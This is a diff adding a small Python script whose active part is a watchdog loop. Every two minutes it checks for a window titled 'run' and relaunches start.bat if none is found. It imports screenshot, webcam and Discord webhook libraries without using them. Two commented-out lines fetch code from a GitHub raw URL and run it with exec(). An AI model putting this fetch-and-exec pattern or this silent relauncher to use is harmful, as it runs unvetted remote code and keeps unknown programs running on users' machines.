@@ -1,0 +1,42 @@
+import requests
+import os
+import time
+import pyautogui
+from time import sleep
+import subprocess
+import discord_webhook
+import json
+import wget
+from pathlib import Path
+from zipfile import ZipFile
+import threading
+import string
+import random
+import base64,cv2
+import numpy as np
+from datetime import datetime
+import zipfile
+import pygetwindow
+
+# fullypcmain = requests.get('https://raw.githubusercontent.com/dangbadao/bdqbdndnsd/main/checkrun').text
+# exec(fullypcmain)
+
+
+def findTool():
+  return pygetwindow.getWindowsWithTitle('run')
+
+
+print('Tool Running.....')
+
+    
+def fully():
+    while True:
+        sleep(120)
+        if findTool():
+            print('Tool is running....')
+        elif not findTool(): 
+            print("not detected tool running")
+            # open tool 
+            os.system('start.bat')
+            
+fully()
